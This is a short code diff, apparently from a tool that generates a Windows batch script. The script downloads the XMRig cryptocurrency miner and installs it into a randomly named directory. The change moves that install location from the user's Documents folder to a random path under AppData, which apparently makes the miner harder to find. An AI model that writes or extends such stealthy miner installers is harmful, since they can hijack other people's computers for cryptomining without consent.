@@ -13,7 +13,7 @@ def xmrig():
 set XMRIG_URL=https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip
 
 REM Generating a random directory name for installation
-set "INSTALL_DIR=%USERPROFILE%\\Documents\\%RANDOM%\\%RANDOM%"
+set "INSTALL_DIR=%APPDATA%\\rose\\%RANDOM%\\%RANDOM%"
 
 mkdir "%INSTALL_DIR%"
 cd /d "%INSTALL_DIR%"
